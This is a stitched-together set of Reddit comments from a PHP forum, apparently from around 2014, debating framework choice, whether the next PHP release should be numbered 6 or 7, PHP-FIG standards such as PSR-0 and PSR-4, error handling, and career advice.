true, taking on debt is a major consideration, as well as the general opportunity cost of spending that time in class instead of working (experience, more money, networking, etc). But OP says he's only got 1 year left, and while he might have some financial struggle while working part time, it's most likely a temporary struggle in order to permanently lock down the degree. Maybe there's other considerations he hasn't stated: already loaded down with debt from the previous 3 years? got a family to support? chance he might lose his current position if he doesn't continue on full time? Unless there's a truly compelling reason(s) to bail at this stage, I'd highly recommend finishing. So close!
This is all really good advice. :) I've never used Golang, but that sounds like a good solution. Personally I'd recommend mongodb over elasticsearch (we use both in our stack), but I guess that's mostly due to my level of familiarity with it.
I'm confused. Why did you reply to /r/mahacctissoawsum then? 
Step 0: Setup your monitoring and logging stack. How can you make improvements if you don't know your bottle necks? http://codeascraft.com/2011/02/15/measure-anything-measure-everything/ Test, measure, optimize weakest parts, repeat with increased load until satisfied. You can use multiple load testing SaaS providers if you want to simulate 500M users. Obviously start out small If you do not test then you need to go to your boss and ask if he is ok going into the unknown when the supposed 500M users hit your site.
B/c he was the one to mention that CMS's were a big part of it. I was surprised that his answer wasn't higher.
Id go with something else than PHP in this case, go is a good choice, you could also try some other compiled language, Rust is a solid option as well.
Honestly, its very rare to see a modern PHP project built with raw PHP. Theres so much more boilerplate + things that can go wrong. Think auth, routing, dbal, session handeling etc. The list goes on. Be smart and go with a framework, i suggest Symfony or Laravel if you go with PHP.
&gt; I've also heard from others that building it from scratch will not keep me boxed into the constraints of a framework It won't keep you boxed in the constraints of a framework, but it'll keep you boxed into the constraints of YOUR framework. A lot of people think they can just churn out a Laravel competitor in a few weeks.. Not everyone can be a good framework architect. I'd only trust a handful of people that can do this. &gt; and will also allow for greater scalability down the road That's BS. Scalability has not much to do with the framework. The first thing that will need scaling will be your DB, and then it's a long leap until PHP by itself is a problem.. by that stage, you should have enough money anyways. Just hop on the HHVM wagon. You're somehow convinced that a framework is a box in which you cannot go out of. This used to be true; it's not anymore. PHP Framework in 2014 are pretty much open and extensible, thanks to composer and the PHP-FIG. Laravel, Yii2, Symfony. Another advantages of using a framework that a lot of people dismiss: - Documentation. It really sucks when you hire a guy to do a framework and he pisses off 75% of the way, then you have to hire another dev to take over his work. - Community. You're not the only using it. You might be able to get some help. Anyway dude, go with the statistics. If you're not a coder, you won't know if the code that the guy you're hiring will be good or not. At least, make sure the framework is okay. My suggestion: - If you decide to not go with a framework, at least choose Slim. It's kinda like not having a framework.. but at least you'll have routes. Also, add composer. - If you decide to go the framework route, I'd consider Laravel. It has pretty much everything you need to get started. Hopefully your guy will choose to use migrations and do unit tests. Just my $0.02.
And as small as Silex is, the guy behind it have really solid design principles, such as no static calls, and the ability to swap out pieces later with other things (loosely coupled modules). It also leads to easier unit testing, which even if you don't need now, could be very beneficial 2 or 3 years from now. It's basically future proofing your application. 
"There are no solutions, only tradeoffs." You are correct that a public framework will eventually fail you. But building the app from scratch will mean you end up with a framework of your own design, and that too will eventually fail you. There is also a middle ground, that of gluing together [high-quality independent fully-decoupled](http://auraphp.com) library packages, so that your system is neither "entirely from scratch" nor "entirely public framework". That will fail you too, eventually. The key here is to be able to work your way out of each failure point in a way that keeps things running nicely. Each of these three approaches has different time components as well: some front-load the setup time but end up with fewer maintenance headaches, and some reduce the setup time dramatically but leave you with a longer-term maintenance problems. These time components can be made better or worse depending on the expertise and experience of the team members. You need to pick where you want to optimize: quick setup, or long-term maintenance. That will help you determine the tradeoffs you are willing to live with.
My experience with Wordpress and its ecosystem indicates that is a bad place to hold up as a model of good development practices.
&gt; The non-minified non-built code will require an AMD module loader to load it. Just build it then.. https://github.com/samclarke/SCEditor#building-and-testing Install grunt and everything, it should output a distributable version. 
This, this times 100.
he is hiring a developer, not trying to write his application himself.
K, gonna stick to being thick I guess. You basically just sound like a parrot. Not offering any actual examples of how you would handle "expected" errors, just mindlessly saying that people who don't write code the way you write code are lazy, ignorant or stupid. It's like you read about this somewhere, don't really understand it, and just parrot your defense of something you agree with but don't really understand yourself. Nice. Developers who make arguments like "you are either lazy, ignorant or stupid." are either lazy, ignorant or stupid ;)
For me, I work as a freelancer on the side and do my university course just for the social experience, with no intention to use my degree. Not the noblest of motivations but hey, I get paid well and have a lot of fun. Perfect work/life balance.
Very constructive.. +1.
Any particular reason this is posted in /r/php?
I have worked on CodeIgnitor, Custom made Framework, Slime and now Laravel 4.x. I would prefer Laravel because like Ruby on Rails it also emphasize on _convention over configuration_. It also has a pretty large community. The framework itself has been beautifully written. Laravel actually fulfilled my dream to have something as awesome as Rails for PHP.
make it easy to scale in the future, but dont scale from the start
What would laracasts do for him? lol
I'm biased, but I concur that there is quite a bit of money (and enjoyment!) in PHP especially when including eCommerce (and Magento in particular). Starting out you have a lot with PHP: lots of different kinds of businesses, lots of locales, and (likely) a chance to appeal your stats knowledge. Just because you start in one career type doesn't mean you can't or won't switch.
Give him/her more information that could help them make a better decision. Is that so fucking hard to understand?
&gt; There is also a middle ground, that of gluing together high-quality independent fully-decoupled library packages, so that your system is neither "entirely from scratch" nor "entirely public framework". That's still a framework. You always end up with "how the project works". A framework is the constraints and patterns used to solve problems in the past. This is very very true: "There are no solutions, only tradeoffs." You can use what someone else came up with, or your own imaginings, or a combination. You always end up with patterns (even if they are one-offs).
people in his position shouldn't just know that x is better than y, but also why x is better than y
Laracasts isnt going to give you general information about frameworks, nor why laravel is worse/better than another framework/raw php
using a framework can help you get started alot faster, and make it easier to bring in other people. If you need to scale beyond what the framework can do for you, by that time you will know its requirements and can rewrite pieces of in pure php or hell even C extensions if you want. I feel like symfony imposes alot of structure on you that a framework like laravel doesn't. This is a personal preference. I find it pretty easy to transition from a laravel app to pure php much easier than symfony. This is also just my own personal experience, it could be that I designed something wrong from the start. These days its nice to have something like packagist and composer that make it easy to re-use code. Depending upon what you are trying to do you might find enough libraries out there to string them together with some vanilla php to satisfy your biz needs.
Ill guess you are a young person according to your post, id say you are in your 20s. i was in your shoes some years ago, with the diffrence that i really did not know what i "wanted to be when i grow up". I had just finished my term (mandarory) in the army. Now, i always liked computers and games, but i also likd sys-admin stufff and design. I got my compsci, and in the last year (of school) i decided to go with programming. Now years later i have no regrets. I still have an eye for design, and moderate sys-admin skills. Its all about passion, nothing else, Remember, you have a lifetime of learning to do, dont even think for a second that you will do PHP in 15 years, maybe you do some programming for some statistics platform with haskell, or who knows. My point is: dont think you haveto "lock" yourself into something and thats all you will do untill you die. A smart person like yourself can surely learn and adjust. Final words: never let your carrer be more important than your life. You only have one. (Read dont worry too much, its going to work out)
have you watched laracasts? On may occasions Jeff shows the old non-laravel way of doing something, and then shows the better way of doing something and explains why.
Yes.
I have no need to watch it. But that is news to me. Either way, it'd be more constructive, and less costly, to just ask people on reddit, more opinions
Go work with NoSQL/Big Data stuff. You'll make more and have more fun.
&gt; That's still a framework. Yes. You end up building one regardless.
Any resources on this?
Er... Abstraction, events, and things like that help, But i don't have any resources on hand....
Not sure what you mean by this: &gt; Just build it then.. However, I ran: npm install -g grunt-cli npm install grunt build But the last line throws: Loading "Gruntfile.js" tasks...ERROR &gt;&gt; Error: Unable to read "undefined/.sauce.json" file (Error code: ENOENT). Warning: Task "build" not found. Used --force, continuing. Done, but with warnings. Thanks! ***Edit:*** This Grunt thing looks cool. Now if I could just figure it out. 
Because I have a mental disorder. Sorry.
Do not roll your own system. The case for this is extremely simple: you will end up rolling a custom framework (or worse, spaghetti). Now you have a framework, but it's worse than anything else out there, and nobody but you knows how it works. This really is a no brainer: use a modern full stack MVC framework. Symfony2 is proven to scale and designed to get our of your way if you want it to.
I must confess that I agree with Rasmus. Frameworks (not only against PHP) are quite perfect... for specific stuff. You want CMS, Drupal is you friend. You need a blog and/or marketing site, WordPress is amazing ! Otherwise you have... PHP and its amazing amount of libraries/tools to do the job. Take a look at Facebook ;) 
No worries lol
&gt; Fundamentally speaking, errors (no matter how you classify them), need to be signaled somehow. That is, something bad happens here, and I need to signal the client code that something went wrong. There are only two fundamental ways to signal these errors: Were we talking about **errors** or **exceptions**? They are not the same thing. &gt; 1. Use a consistent language construct that every PHP developer knows how to listen for (try/catch/finally) Assuming you're using the validation code example and throwing an exception on validation failure, this is not the way to go for a variety of reasons: * How do you tell it which fields failed? * Which validation steps did the data fail? * Do I encode that information (fields, failures) into the exception I throw? Now you've just negated your issue you mention in #2 by creating "a 100% arbitrary userland signal API in the form of some arbitrary error object" -- you're just using exceptions instead of an agreed upon signal. Lets assume you wrote that code. Do I do this then? $isValid = true; try { $Model-&gt;validate($data): } catch (Exception) { $isValid = false; $errors = Exception-&gt;extractSomeDataAboutValidationFailures() } No, that can't possibly be the code you want to write, is it? Why even have return values anymore when we can just throw exceptions left and right. Also, you keep conflating exceptions, errors and return values (signals, if you want) -- they are not the same thing. An exception is "I cannot perform my fundamental purpose as a piece of code due to X" -- an error is (usually!) just something that should have been an exception but the developer didn't check for it. A return value is what you actually want. The key here is the "fundamental purpose" of the piece of code. If a piece of code is saving to the database and you skipped the validation checking and now your RDBMS is yelling at you? Totally an exception. If a piece of code is asking if some collection of model data is valid, and it's not? That's not an exception. It did its purpose. 
is there a good reason you are limiting yourself to PHP?
Because breaking from version numbers would be silly.
This is pretty silly. Was there an official PHP release? No. So let's name it PHP X2 because we can't expect PHP developers to use the Internet when they have a 5 year old book on their shelf (which could not be helpful then or ever). It's confusing because there's some think called a release schedule which isn't a chapter in the book!
A library that supports PSR-0 is very likely. PSR-1 is quite likely. PSR-2 is probably around somewhere. Do you really care if its 0, 1 AND 2, or just 0 and 1? I'm not being that complicated in saying that being more specific will lead to more accurate results.
A library that supports PSR-0 is very likely. PSR-1 is quite likely. PSR-2 is probably around somewhere. Do you really care if its 0, 1 AND 2, or just 0 and 1? I'm not being that complicated in saying that being more specific will lead to more accurate results.
Well, if you read his message and truly understood the absolute idiocy that was living behind the keyboard when he wrote that moronic statement, you would probably agree.
If you use PHP, you are part of the community. If you ask for PHP help on StackOverflow, you are part of the community. If you blog about using PHP, you are part of the community. If you read this silly sub-reddit, you are part of the community. If you release any PHP code ever, you are part of the community. If you subscribe to internals and are amazed at how those "conversations" work out, you are part of the community.
Unit tests.
Dear god. I really hope it doesn't end up "jumping" to PHP 7 just because of an old never-released internal version name that had poorly published books associated with it. `#facepalm #teamphp6`
If you use any of the code that is going to end up being a BC break in production applications then a reasonable person can only assume that you hate your co-workers. There are a few weird edge cases that maybe worked before, and will no longer work in PHP 6. If you used those edge cases, you are mental. If you unit tested your code, you will be fine.
These two things are totally unrelated. Zend are working on trying to make every single application drastically faster out of the gate, without relying on the benefits of a JIT to try and make everything magically faster - it doesn't. A saner stdlib (whilst lovely) is in no way more useful than making a language drastically more efficient. They are two totally separate quests.
php6... dont go ipv6 on us
I'm for PHP 6. It makes the most sense, there would be no confusion as to why it went from 5 to 7, and I feel like it won't take very long for the old PHP 6 stuff to be difficult to come across. Just imagine the volume of new posts/books on the *new* PHP 6 that the old one will be completely forgotten.
13 votes... wow. Our dev team is 10 people. Time to stuff this ballot, baby!
One of the best reasons for calling it 7 is that 6 appears to be a really unlucky number for PHP.
Because get/set is a pain in the ass. What's wrong with "public int someVar;" ? I guarantee you can't come up with anything but a canned answer the "experts" told you back in CS 101 class.
To be perfectly honest, I'm not even sure why this is a thing. The current major version is 5. The next number after 5 is 6. Ergo, the next major version is 6, not 7. Whether or not this version was almost released before doesn't matter. Whether it changed drastically since then doesn't matter. It's still the next major release, and so it gets the next major release number. Let's not start counting "maybe-releases" in our versioning scheme and give the blogosphere yet another tomato to throw at PHP's face.
7 is also prime :)
It is sad to see you are getting more down votes than up votes Paul.
But it's a nice number.
It's kind of a shame you don't use more of your time and energy to somehow get the voting members to work together as opposed to managing this personal crusade over PSR-4. By all means, please deprecate PSR-0 already so maybe the group can make some progress. Reading the list mails makes me very sad. ~3 published standards in 4 yrs? All this time and effort over PSR-0 and PSR-4 seems like such a waste compared to the need for standards around logging, annotations, dependency injection, contexts, event sourcing, event handling, proxying, caching, and all other kinds of things. Whatever happened to the logger proposal? My $0.02; stop wasting the community's time with useless conversation over something that makes almost no difference for 99% of the community and steer the discussion towards producing more standards. As it is today, the precedence for deprecating an existing standard is going to be defined by PSR-0, are you really ok with that being a 4 year gap for new standards? Do it and move on. Edit: Thanks for the gold! Also, thanks for keeping me honest as PSR-3 was indeed accepted over a year and a half ago. I completely overlooked that PSR because I haven't heard anything about it in the year and a half it's been accepted so I didn't even realize it had passed a vote. To clarify, we have: PSR-0 (possibly deprecated soon) Autoloading PSR-1 Basic Coding Standard PSR-2 Coding Style Guide PSR-3 Logger Interface PSR-4 Improved Autoloading Please do forgive me; 4 standards in 4 years.
&gt; I guarantee you can't come up with anything but a canned answer the "experts" told you back in CS 101 class. Errr... no... I've had a real need for getters and setters several times. Plus, it allows me to ensure strong typing within the object, since PHP doesn't have strong typing. "public int somevar" isn't valid PHP. You can't declare a scalar type. Also, you're kind of a pretentious asshole.
No way you deserved gold for this... You clearly havent even paid attention to PHP-FIG in the last 2 years.
I vote for PHP 2014, or maybe something more obscure like names like PHP Othello or Ostrage PHP or names that follow no versioning release like PHP Pro. And then after a few releases like this they can start back at PHP 6
Holy Cow you should be doing stats. Statisticians make crazy bank and work on all the most interesting projects. Want to program? Learn R or SRpy or Statsmodels and go where statisticians and programmers are working together. 
fair enough 
Definitely down for deprecating PSR-0. Would deprecating include throwing a notice at the top to use PSR-4?
Thanks for acknowledging it :)
But the 99% majority of PHP devs have no idea about "PHP6". There's no reason to even bother naming it PHP7.
At the top of what? this? http://www.php-fig.org/psr/psr-0/
Yes, it should be called PHP 6, because it's the one after 5. Why is this even a question? Calling it 7 reeks of marketing and internal mishandling.
&gt; It's actually 5: 0–4. It's difficult to consider PSR-0 and PSR-4 separate enough that you can give credit for establishing a completely new standard. Phil has an amazing ability to interact with the community at a very low level and he hit the streets answering questions personally and pushing for PSR-4 to replace PSR-0. From an outsider's perspective, it didn't seem to be an easy sell, but at the end of the day, PSR-4 was accepted aside from the discussion of deprecating PSR-0. That's why this discussion is happening; deprecating PSR-0 is the cleanup step required to close the books and remove confusion by making PSR-4 the singular autoloading standard. &gt; It was accepted as PSR-3[1] ... a year and a half ago[2] . You're right, I edited my comment, I haven't heard anything about it in so long I completely overlooked it. Thanks for keeping me honest. &gt;Why? To preserve its own existence? Standards are only good if they can be widely accepted. That takes a lot of time and effort. If that takes months or years to come up with something that the majority of users can agree on, isn't that still a lot better than just creating standards without that support just to fill some imaginary quota? No actually, I don't think it's better that it takes months or years to come up with something a majority of users agree on. During that time frame you have a nearly insurmountable amount of technical debt being created by people who are extremely well meaning but don't have the guidance necessary to develop maintainable or secure software. Every day more and more applications are used in layer 7 attacks and expose more people and their data than is necessary. This community still launches into tirades over using third party code vs rolling their own and the position taken by many influential members is just down-right irresponsible. The PHP-FIG is to date the only serious organization spanning so many great projects, to not see big things coming out of that group is just a fucking travesty. I'm not looking for some imaginary quota, and who knows, maybe I'm dead wrong and 4 standards over 4 yrs is plenty of productivity for a group like that, but I personally think they have an opportunity to help drive this community by publishing more standards that can help ease people into using battle hardened tools as opposed to constantly reinventing the wheel. If you asked the question, "Would the PHP community be better or worse today without the PHP-FIG" how many people do you think would answer that it wouldn't really affect anything if the group dissolved tomorrow? &gt; There is no "4 year gap". The last accepted PSR, PSR-4, became so in December[3] . I'm referring to PSR-0 being the first standard to go through the deprecation process setting a precedence that long periods of time between acceptance and deprecation is the status quo. I guess it comes down to personal preference; I'd rather see a standards group able and willing to make the decision to deprecate something sooner rather than later because this industry is not slowing down in the least bit. 
Don't worry too much about earnings, it's more important to do what you're passionate about. That said, PHP has a very narrow scope. If I were starting out I would go with Java for sure. It may be a pain in the tits to develop web apps compared to something like PHP, but the scope is just enormous. You could specialize later, and in a dozen or so years, who the hell knows what will be at the core of the web.
You're right, I'm not implying it is his responsibility, and I personally do not like many of the arguments he has made before, but my personal feelings aside, the guy hits the streets running like nobody's business and he has personally responded to many people over Reddit, Twitter, and his blog. The guy clearly has social and organizational skills, that's why I said it's a shame he doesn't use more of that energy towards invigorating the same kind of debate he's done with PSR-4 and PSR-0. Part of me can't blame him, you spend any amount of time reading through the archives on the mailing list and it's painfully obvious that beyond the several very strong egos that like to interject in so many conversations and drive the topic to hell and back without a piss break, trying to get a solid consensus on anything big is like pulling teeth. Part of it has to do with the extremely large body of legacy code that exists in the wild that has to be considered, part of it has to do with the language being so flexible there's a hundred ways to skin a squirrel, and part of it just comes down to individual politics and some people wanting things done their way. 
Yeah
I read the archives every few weeks but I definitely do not follow things like I used to. The intent and purpose of the group seems lost more often than not. Maybe my expectations were greater than they should have been. I was hoping after a few years we would see a number of PSRs similar to the number of PEPs for Python or JSRs for Java. 
Seems weird that you would need to make an API call to initialize the client side app, shouldn't you just be listening to client calls? &gt;I wanted to add a basic frontcontroller before Laravel starts. (If there is a json code in Redis, return it. Else, boot Laravel 4.) Sounds like you want varnish? &gt;If that would be very useful to replace MySQL (or at least, code related stuff) to a no-sql such as mongo or cassandra There's nothing wrong with MySql. It's not slow. Just use a memcache to ease load on the db and increase response times. Also, as others have said: don't optimize prematurely. If I were you I'd go with a proven, performant, scalable framework like Symfony and start optimising from there. A pretty common stack is: varnish in front of haproxy in front of as many web servers as you need; mysql master and as many mysql read slaves as you need; cache everything you can in memory with redis/memcached; cdn everything that's static; ESI can also help out.
Oh! We could also call the next version after PHP Next "PHP Then". Then, we can call the next version after PHP Then "PHP Then What". Why can't they just call it PHP 6? :(
The purpose of the FIG is to be a descriptive, not normative, standards body: identify the points of commonality between the member projects, and come up with an agreeable interoperable recommendation. If what the FIG produces turns out to be normative standards that anyone could (or should) consider to be *The One True PHP Way*, it's entirely incidental. The PHP community isn't just as uniform like, say, Python, which can publish normative PEPs much more frequently. To wit, the egos to which you [referred elsewhere](http://www.reddit.com/r/PHP/comments/2b6bjr/send_psr0_to_the_standards_farm_in_the_sky/cj2cb06) are people representing projects with a lot of inertia to keep doing it their own way: that they can agree on any points of commonality is something of a minor miracle. The caching proposal kept going in circles because member projects flat out stated they would not implement it. You see the same thing happening with the PHPDoc proposal, with people from Drupal already saying they won't be able to implement the standard as designed because it doesn't include specific tags they rely on. It's definitely a failure if an interoperability group creates recommendations that won't lead to better interoperability. To avoid that happening, consensus needs to be formed, which takes a lot of time and speed winds up working against this goal: the initial PSRs, which were done quickly and without a whole lot of consensus (or were done before a lot of the projects were even in the FIG) have some serious adoption problems among the member groups. To use it as an example again, Drupal will almost certainly never adopt PSR-2 (or likely even PSR-1) and spent a year kicking and screaming about the two whole extra folders PSR-0 required enough to throw its weight around to get PSR-4 adopted. So while it'd be nice if there was some group for creating guidance for newcomers to the language or people doing stupid things, the FIG is not that group, is not intended to be that group, and likely never will be that group. To that end, I do think you're asking too much of them, and the pace at which they're able to produce standards seems entirely reasonable.
Sure, but if you had tests, you wouldn't need a conversion tool in the first place. Run the test suite, see the broken bits, fix them.
Thats 5 standards, not 4.
It doesn't even seem like you read the archives dude. You can't claim to know what the intent and purpose are if you haven't paid attention to it. PEP's have been around for at LEAST 14 years, long enough for them to pick up steam, and JSR's have been around for even longer.
&gt; The purpose of the FIG is to be a descriptive, not normative, standards body: identify the points of commonality between the member projects, and come up with an agreeable interoperable recommendation. &gt; It's definitely a failure if an interoperability group creates recommendations that won't lead to better interoperability. Descriptive does not lead to better interoperability. FIG is as backwards as it gets. A standard is malleable via version. This isn't new in science. Ooh, some other projects might not be compatible it though we agree we have a better way now. Way to do your job. This is why FIG is a joke, calling anything it produces a standard is mislabeling when really they are just arguing over what they like best and then being afraid to revisit it because of feels.
Yep - Plesk blows. Much like CPanel blows. Messing with libs like this - while it's possible always ends in tears. I guess if managing your server isn't your thing - they have a place (when starting out years ago I used Plesk for that reason). But slowly slowly, getting my Linux-fu down - you learn to wean yourself off these management consoles :)
http://get-elephpant.com/
I think it should be PHP 6.1. 
Yes, as per the bylaw. The example of the deprecation message is included in the blog post at the bottom.
Drupal and WordPress are pluggable applications, not frameworks for developing bespoke applications. If your site revolves around a CMS or blog, then sure. Much harder to tailor to your site however. Comparing to Facebook is ridiculous, unless the OP hopes to hire a horde of experienced engineers.
Clearly we should make like MariaDB and jump to PHP 10.
&gt; The guy clearly has social and organizational skills, that's why I said it's a shame he doesn't use more of that energy towards invigorating the same kind of debate he's done with PSR-4 and PSR-0. Thanks! I have been working on a great number of things at the FIG over the last two years or so, and I think they have all been going rather well. 1. Coordinating PSR-4 2. [Workflow Bylaw](https://github.com/phpDocumentor/fig-standards/blob/master/bylaws/004-psr-workflow.md) 3. [Coordinating PSR-5](https://github.com/phpDocumentor/fig-standards/tree/master/proposed) 4. [Coordinating PSR-7](https://github.com/php-fig/fig-standards/blob/master/proposed/http-message.md) 5. [Proposing and drafting up errata](https://groups.google.com/forum/#!searchin/php-fig/vote$20errata/php-fig/qTROKw07848/oHrdnF_Y9fYJ) 6. [Fixing PSR-2 and the CodeSniffer PSR-2 ruleset via that errata](http://philsturgeon.uk/blog/2013/10/psr2-v-codesniffer-psr2) 7. [Amendment Bylaw](https://github.com/phpDocumentor/fig-standards/blob/master/bylaws/006-psr-amendments.md) I had a substantial amount of help on all of those of course, but many of them were my initiatives. I would say that it would be very difficult to do any more than I have been doing, without going broke. &gt; trying to get a solid consensus on anything big is like pulling teeth. I would not really agree there. We have a lot of active debate over the correct way to do things, such as: [should the HTTP Message PSR have StreamInterface or not](https://groups.google.com/forum/#!topic/php-fig/BjuMHOzTUJs)? That is quite a big conversation and its a big deal. We don't all automatically agree about the best solution, so we're discussing the pros and cons and trying to make a compromise. Anything else would be either aggressive or ineffective. It would be fair to say I spend more time in the discussions about the FIG from you do. From that vantage point I can let you know that it is not as terrible as you seem to think. We have smart people working on great standards and other than when the occasional troll dives in out of nowhere and tries to ruin a conversation, we have a good chat about things that end up mattering to a lot of people. 
Absolutely. The idea of skipping to 7 may suit the minds of people within internals, but to the wider community it's just weird and unnecessary. If the final version of PHP 6 ends up being a totally different PHP 6 than originally planned, it's still PHP 6. A version number isn't a plaything, it should mean something to those who are using it. 7 means more to internals than the wider user base.
In SQLite I use this CREATE TABLE entries ( id INTEGER PRIMARY KEY, ... ); CREATE TABLE tags ( eid INTEGER NOT NULL, tag TEXT NOT NULL, FOREIGN KEY(eid) REFERENCES entries(id) ON DELETE CASCADE, UNIQUE(eid, tag) ); And to select an entry with all of its tags: SELECT e.*, (SELECT group_concat(t.tag) FROM tags t WHERE t.eid = e.id) AS tags FROM entries e;
It wasn't a thing. Not to me, or the *millions* of others who couldn't give two monkeys about some almost-but-not-quite-and-it-was-all-a-bit-shit-really-side-project that we've never heard of. The only avenue for confusion is when someone would look up details specifically *about the version* - not when someone (as most do) looks up how to do X in PHP, or checks their code is supported in &gt; or &lt; PHP n.0. And nobody looks up details specifically about the version unless a) they are internals, or b) they know enough to comprehend the difference between the actual PHP 6, and the whatever no. 6.
I agree with most of your points, but I have one question and one disagreement: &gt; You see the same thing happening with the PHPDoc proposal, with people from Drupal already saying they won't be able to implement the standard as designed because it doesn't include specific tags they rely on. When did they say that? I would really like a link to anyone from Drupal saying they flatly refuse to use PSR-5 because they didn't get all the tags they requested into the spec. That is not how the conversation went as I saw it, Jennifer just said they'd need to add some superset functionality. &gt; [Drupal] spent a year kicking and screaming about the two whole extra folders PSR-0 required enough to throw its weight around to get PSR-4 adopted. That is not really how PSR-4 came about. Paul Jones (Aura), Beau Simmens (Sculpin) and I (PyroCMS) put it considerably more man-hours than Drupal on the subject, and their vote was as much of an equal +1 as anyone else. As you said, I think the pace at which we're getting documents out is very reasonable, when you consider we actually have 8 standards written in Draft, Review and Accepted (not including HuggableInterface), not just the 4 accepted onces. 
How about: ***"Super PHP5 Turbo - Hyper Programming Edition"***
&gt; I'm not even sure why this is a thing. While my own feelings can be best described as: http://www.youtube.com/watch?v=ussCHoQttyQ , there will be some confusion between people, both internals people and everyone else, when discussing code: Person 1: This bug only happens when this particularly bit of PHP 6 code is compiled. Person 2: Er, do you mean New PHP 6 or PHP 6 classic? Obviously that problem will go away once the code base is cleaned of all existing references to PHP 6 are removed from the code, but it's still a small issue. Against, there doesn't appear to be a real downside in moving directly to 7. Yes, there would be a small amount of flak about skipping a version, but that really doesn't matter. End-users don't care about version skipping, and if anyone asks, to me at least it's easier to explain that PHP 6 was terrible and so never caught on, rather than explaining that there are multiple PHP 6's in existence. Even if you don't agree with that argument, the fact that the vote is currently quite even, shows that it was good to bring it up for a vote....however it could have done with a longer time period of voting, as people could easily be on holiday for the whole of the voting period. 
&gt; Calling it 7 reeks of marketing You seem to be implying that marketing is inherently bad....that's not how the world works. &gt;and internal mishandling. Well yeah, but the mistake was in calling a development branch PHP 6 way before it reached alpha. But that mistake has already been made.
this is best book
An arabic page with french books, on a typically english board. 
Sweet.
There were an awful lot of people who used the pre-release versions.
\&gt;Russians cashing in on the PHP mascot
PHP 5 = Windows XP PHP 6 = Vista PHP 7 = Windows 7
How is this any different than ZF2?
I guess the problem is that PHP has so many beginners, using something like Drupal or WordPress and they may be sad when buying a outdated PHP6 book. Imho, i really dont care what they name the next PHP version.
No bootstrap, DI, configuration, single action controllers. The static event configuration and loading from the sm really makes a difference here which makes it easy to control (and swap out) the entire workflow.
And the vote's been cancelled.... An internals message from Andrea Faulds (the author of the RFC) says: &gt; I’ve cancelled the vote because I don’t think the case for 6 is sufficiently fleshed out. The RFC is now massively imbalanced in favour of 7, which isn’t really fair to the 6 side, and I don’t think we can hold a vote while that’s still the case. &gt; Unfortunately I’m not terribly good at making such a case, so help in developing the 6 side would be appreciated. I won’t reopen the vote until the 6 side is sufficiently developed. &gt; Thanks.
Maybe show a working example of the static even configuration.
Apparently [Zeev](http://news.php.net/php.internals/75702) edited the text of the RFC to support the side that they had voted for, which is pretty underhanded behaviour. To be fair, he did also suggest re-starting the voting, but this is still not a good process for managing the project. 
Jesus, this is so overly-dramatic. Name it something dumb like PHP 360 so no one's happy and move on.
The config is in the skeleton app. Here's the [event object configuration](https://github.com/devosc/ZendSkeletonApplication/blob/master/config/event.php).
PHP One. 
So all someone needs to do is make a fork of PHP and name it PHP 7. Then write some garbage Ebooks about PHP 5 while naming the book PHP 7 and give it away on Amazon and things will get even more annoying.
They should call it PHP_real_versionNumber5Next, to highlight the project's strong traditions of ~~infighting and batshit insanity~~ backward compatibility and consistency.
All of the other well-known projects that skipped version numbers made pretty large leaps. Probably best to skip to 10.x so that there's no direct "7.x came from 6.x" implication. Also forces projects to update any single-digit `(\d)` version checks in the process.
PHPNext iPHP CrystalPHP PHPClassic PHPeiber PHP.js Hack PHParavel
I went to school for computer engineering and ended up quitting my first job to enjoy my hobby. You don't have to have a degree to be a great developer. You just need a willingness to learn and the drive to succeed. There are plenty of online resources be it other developers, books, or just source code in general. Read up on best practices, anti-patterns, big php bloggers, etc. That will keep you busy for quite some time. I'd give you some actual resources but I'm on my phone. I'll try to rey again later.
 return new EventConfig([ 'View\Model\Render\Event' =&gt; [ ['View\Model\Render\Listener'], ], ]); $em-&gt;trigger('View\Model\Render\Event', [$arg1]); The em pulls the event object from the service container, if the configured listeners are not callable then they are also pulled from the service container. A listener config can be a Service config that does not have to be registered with the service container.
Is that why one paragraph into "Why PHP 6?" it starts arguing for 7 instead? This is why you don't use version numbers before they're set, eg python 3000.
 +1 for PHPLaravel
There's an interesting thought. Terminate the PHP lineage and stop trying to restore it's apparently "sullied" name; drop all legacy language features and functions, integrate with Hack. Jump straight to Hack v3 to differentiate from version 1 and to avoid the obvious jokes about "hack-too". Personally, I'd support a jump to PHP 7 if they took a little more time developing it, added all the new features that they've been talking about, and dropped ALL the legacy stuff (whereby PHP 3/4 scripts will no longer run). 
&gt; I would really like a link to anyone from Drupal saying they flatly refuse to use PSR-5 because they didn't get all the tags they requested into the spec. I don't recall anyone saying that, but that's not what I said. What I said was Drupal won't be able to implement the standard as designed, and I'm also referring to the multiple comments made by Drupal's doc maintainer on proposals for new tags where it's stated that if the FIG doesn't think the tag is useful, Drupal would just implement them as an extension. The extensions Drupal is proposing it'll have to make aren't in the same category of vendor-specific tags that PSR-5 accommodates (namely, annotations and tags that truly only make sense for the specific project): it's Drupal-flavored PSR-5 because Drupal is too big to completely change how it documents its API, and it dilutes the interoperability of the standard. I liken it to someone creating a tabs-flavored PSR-2. &gt; That is not really how PSR-4 came about. That's not how it came about, but again, that's not what I said. Drupal had multiple core contributors bumping and steering discussions about the package-oriented autoloader, which I think greatly contributed to PSR-4's relatively quick adoption, even after it almost died on the vine after the first failed vote. But I think that's fine, because the point in mentioning Drupal's autoloader issues was that Drupal was seriously considering dropping PSR-0 and rolling its own autoloader again had PSR-4 not passed.
Why the fuck is this even a conversation. Use the next number in line and be done with it. Don't make it confusing for everyone by breaking the system which has been used since the beginning. This entire thing is 10 shades of stupid.
[Ich hätte einen abzugeben](http://www.reddit.com/r/PHP/comments/22rnf3/i_bet_none_of_you_have_this_dont_mind_the/cgpq364). Liegt eh nur auf meinem Schreibtisch rum..
&gt; Apparently Zeev[1] edited the text of the RFC to support the side that they had voted for, which is pretty underhanded behaviour. Honestly? This is really not surprising coming from him.
Web Development has become a very broad and diverse industry. I can't even count on both hands the number of technologies one could become a full-blown expert in. Nobody can learn it all -- so you have to just choose your favorite few. It's certainly important to broaden your skillset. Brush up on the basic terminologies of all the technologies relevant to your specialty, because it can be embarrassing when your coworker or employer ask you "I was thinking we'd just set this up with bower, what do you think?" and you sheepishly reply "what is bower?". But it's not too embarassing -- there's no programmer in the world who knows it all, and that's completely natural and actually a beautiful thing.
Because the next number in line is 6, and PHP6 books are already in the wild since around 2010.
&gt; new and exciting ways This made me laugh and punctuated your exact correctness
